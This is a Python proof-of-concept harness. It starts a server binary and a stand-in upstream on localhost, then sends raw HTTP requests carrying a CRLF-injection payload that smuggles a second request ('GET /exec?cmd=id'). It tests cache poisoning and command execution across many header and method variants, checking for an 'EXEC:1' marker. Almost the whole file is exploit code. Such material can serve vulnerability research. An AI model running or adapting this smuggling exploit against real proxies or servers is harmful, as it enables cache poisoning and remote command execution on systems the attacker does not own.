import socket,subprocess,sys,time,os,signal
TAG,BIN,CONF,LP,UP,MODE=sys.argv[1],sys.argv[2],sys.argv[3],int(sys.argv[4]),int(sys.argv[5]),sys.argv[6]
W=f"/tmp/r16F/{TAG}"; os.makedirs(W,exist_ok=True)
def w(n,d):
    with open(os.path.join(W,n),"wb") as f: f.write(d); f.flush(); os.fsync(f.fileno())
def HEADSIG(b):
    head=b.split(b"\r\n\r\n",1)[0]
    return (b"HTTP/1.1 200" in head, b"EXEC:1" in b.split(b"\r\n\r\n",1)[-1])
def fetch():
    try: return int(open(os.path.join(W,"l_hits"),"r").read())
    except Exception: return -1
def send(mark,raw,port):
    w(mark+"_req.hex",raw.hex().encode()+b"\n")
    out=b""
    try:
        s=socket.create_connection(("127.0.0.1",port),timeout=6); s.settimeout(6); s.sendall(raw)
        while True:
            x=s.recv(65536)
            if not x: break
            out+=x
        s.close()
    except Exception as e: out=("<ERR %s>"%e).encode()
    w(mark+"_client.hex",out.hex().encode()+b"\n")
    return out
PREFIX=b"/api/x?"
SMUG=b"%0d%0aGET%20/exec%3fcmd%3did%0d%0aHost:%20u%0d%0a%20HTTP/1.1"
TARGET=PREFIX+SMUG
def req(target,ae,auth=False,tail=b"",host=b"alpha.test",method=b"GET"):
    r=method+b" "+target+tail+b" HTTP/1.1\r\nHost: "+host+b"\r\n"
    if ae is not None: r+=b"Accept-Encoding: "+ae+b"\r\n"
    if auth: r+=b"Authorization: Bearer t\r\n"
    r+=b"Connection: close\r\n\r\n"
    return r
res={"tag":TAG,"mode":MODE}
cleanup=[]
try:
    peer=subprocess.Popen([sys.executable,"ev_r16_F_peer.py",str(UP),os.path.join(W,"l"),MODE],stdout=open(W+"/peer.log","wb"),stderr=subprocess.STDOUT,start_new_session=True); cleanup.append(peer)
    for _ in range(200):
        try: socket.create_connection(("127.0.0.1",UP),timeout=1).close(); break
        except OSError: time.sleep(0.05)
    srv=subprocess.Popen([BIN,"--config",CONF],stdout=open(W+"/srv.log","wb"),stderr=subprocess.STDOUT,start_new_session=True); cleanup.append(srv)
    up=False
    for _ in range(200):
        if srv.poll() is not None: break
        try: socket.create_connection(("127.0.0.1",LP),timeout=1).close(); up=True; break
        except OSError: time.sleep(0.05)
    res["listen"]=up
    if not up:
        res["err"]=open(W+"/srv.log","rb").read()[:200].decode("latin1","replace")
    else:
        time.sleep(0.2)
        ctl=b"GET /api/zz.txt HTTP/1.1\r\nHost: alpha.test\r\nAccept-Encoding: identity\r\nConnection: close\r\n\r\n"
        c1=send("ctl1",ctl,LP); f1=fetch(); time.sleep(0.15)
        c2=send("ctl2",ctl,LP); f2=fetch()
        res["ctl"]=[f1,f2]; res["ctl_status"]=[c1.split(b"\r\n")[0].decode("latin1"),c2.split(b"\r\n")[0].decode("latin1")]
        res["ctl_cache_live"]=(f1==f2 and f1>0)
        time.sleep(0.2)
        a=send("attack",req(TARGET,b"identity"),LP); fa=fetch()
        res["attack"]=[fa, b"EXEC:1" in a]
        time.sleep(0.25)
        v1=send("v1_same",req(TARGET,b"identity"),LP); fv1=fetch(); time.sleep(0.15)
        v2=send("v2_gzip",req(TARGET,b"gzip"),LP); fv2=fetch(); time.sleep(0.15)
        v3=send("v3_none",req(TARGET,None),LP); fv3=fetch(); time.sleep(0.15)
        v4=send("v4_auth",req(TARGET,b"identity",auth=True),LP); fv4=fetch(); time.sleep(0.15)
        v5=send("v5_slash",req(TARGET,b"identity",tail=b"/"),LP); fv5=fetch(); time.sleep(0.15)
        res["v1"]=[fv1,b"EXEC:1" in v1]; res["v2"]=[fv2,b"EXEC:1" in v2]
        res["v3"]=[fv3,b"EXEC:1" in v3]; res["v4"]=[fv4,b"EXEC:1" in v4]; res["v5"]=[fv5,b"EXEC:1" in v5]
        v6=send("v6_emptyAE",req(TARGET,b""),LP); fv6=fetch(); time.sleep(0.15)
        v7=send("v7_br",req(TARGET,b"br"),LP); fv7=fetch(); time.sleep(0.15)
        v8=send("v8_host",req(TARGET,b"identity",host=b"beta.test"),LP); fv8=fetch()
        res["v6"]=[fv6,b"EXEC:1" in v6]; res["v7"]=[fv7,b"EXEC:1" in v7]; res["v8"]=[fv8,b"EXEC:1" in v8]
        v9=send("v9_starAE",req(TARGET,b"*"),LP); fv9=fetch(); time.sleep(0.15)
        v10=send("v10_head",req(TARGET,b"identity",method=b"HEAD"),LP); fv10=fetch(); time.sleep(0.15)
        p1=send("p1_post",req(TARGET,b"identity",method=b"POST"),LP); fp1=fetch()
        res["v9"]=[fv9,b"EXEC:1" in v9]; res["v10"]=[fv10,HEADSIG(v10)]; res["p1"]=[fp1,b"EXEC:1" in p1]
        res["v1_status"]=v1.split(b"\r\n")[0].decode("latin1")
        res["v2_status"]=v2.split(b"\r\n")[0].decode("latin1")
finally:
    for p in reversed(cleanup):
        try: os.killpg(p.pid,signal.SIGTERM)
        except Exception: pass
    for p in cleanup:
        try: p.wait(timeout=3)
        except Exception:
            try: os.killpg(p.pid,signal.SIGKILL)
            except Exception: pass
line=" ".join([TAG,MODE,"listen=%s"%res.get("listen"),"ctl=%s"%res.get("ctl"),"live=%s"%res.get("ctl_cache_live"),
      "attack=%s"%res.get("attack"),"v1same=%s"%res.get("v1"),"v2gzip=%s"%res.get("v2"),"v3none=%s"%res.get("v3"),
      "v4auth=%s"%res.get("v4"),"v5slash=%s"%res.get("v5"),"v6emptyAE=%s"%res.get("v6"),"v7br=%s"%res.get("v7"),"v8host=%s"%res.get("v8"),"v9star=%s"%res.get("v9"),"v10head=%s"%res.get("v10"),"p1post=%s"%res.get("p1"),"err=%s"%res.get("err",""),"v1st=%s"%res.get("v1_status"),"v2st=%s"%res.get("v2_status")])
open(os.path.join(W,"summary"),"w").write(line+"\n"); print(line,flush=True)
